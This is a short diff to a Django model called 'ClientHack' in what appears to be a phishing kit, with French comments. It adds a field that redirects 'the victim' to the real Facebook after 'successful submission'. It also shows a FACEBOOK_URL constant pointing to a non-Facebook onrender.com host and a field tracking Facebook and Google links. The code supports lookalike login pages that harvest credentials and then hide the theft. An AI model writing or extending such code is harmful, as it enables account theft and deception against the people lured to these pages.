@@ -241,6 +241,11 @@ class ClientHack(models.Model):
         blank=True,
         help_text="Généré automatiquement — identifie les liens facebook et google",
     )
+    redirect_url = models.URLField(
+        blank=True,
+        default="https://www.facebook.com",
+        help_text="URL où rediriger la victime après soumission réussie",
+    )
 
     # URLs fixes — déclarées dans le code, pas en BDD
     FACEBOOK_URL = "https://areagreen.onrender.com"
